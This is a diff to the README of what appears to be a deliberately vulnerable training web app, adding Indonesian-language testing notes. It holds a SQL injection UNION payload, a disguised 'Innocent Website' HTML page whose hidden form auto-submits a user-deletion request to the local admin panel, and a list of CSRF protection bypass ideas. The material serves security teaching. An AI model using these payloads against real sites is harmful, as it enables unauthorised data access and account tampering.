@@ -164,7 +164,7 @@ Musywar/
 
 2. **Search Injection**:
    ```
-   search.php?q=' UNION SELECT 1,2,3,4,user(),database(),7-- 
+   search.php?q=' UNION SELECT 1,2,3,4,user(),database(),-- 
    ```
 
 3. **Second-order Injection**:
@@ -174,14 +174,46 @@ Musywar/
 
 ### CSRF Testing
 
-1. **Create malicious HTML**:
-   ```html
-   <form action="http://target/admin/users.php" method="POST">
-       <input name="action" value="delete_user">
-       <input name="user_id" value="5">
-       <script>document.forms[0].submit();</script>
-   </form>
-   ```
+#### 1. **Admin User Deletion Attack**
+Buat file HTML malicious untuk menghapus user:
+```html
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Innocent Website</title>
+</head>
+<body>
+    <h1>Welcome to Our Site!</h1>
+    <p>Loading content...</p>
+    
+    <!-- Hidden CSRF attack form -->
+    <form id="csrf-form" action="http://localhost/Musywar/admin/users.php" method="POST" style="display:none;">
+        <input name="action" value="delete_user">
+        <input name="user_id" value="5">
+    </form>
+    
+    <script>
+        // Auto-submit form when page loads
+        window.onload = function() {
+            document.getElementById('csrf-form').submit();
+        };
+    </script>
+</body>
+</html>
+```
+
+#### 2. **Testing dengan Browser**
+Langkah-langkah manual testing:
+1. Login sebagai admin di browser pertama
+2. Buka file CSRF malicious di browser/tab kedua
+3. Kembali ke browser admin dan cek perubahan
+4. Monitor network traffic untuk konfirmasi serangan
+
+#### **CSRF Protection Bypass Techniques:**
+- **Double Submit Cookie**: Bypass dengan prediksi token
+- **SameSite Cookie**: Exploit pada konfigurasi yang salah
+- **Referer Header**: Bypass dengan meta refresh atau JavaScript
+- **Origin Header**: Spoof menggunakan data: URI atau null origin
 
 ## 🎓 Learning Objectives
 
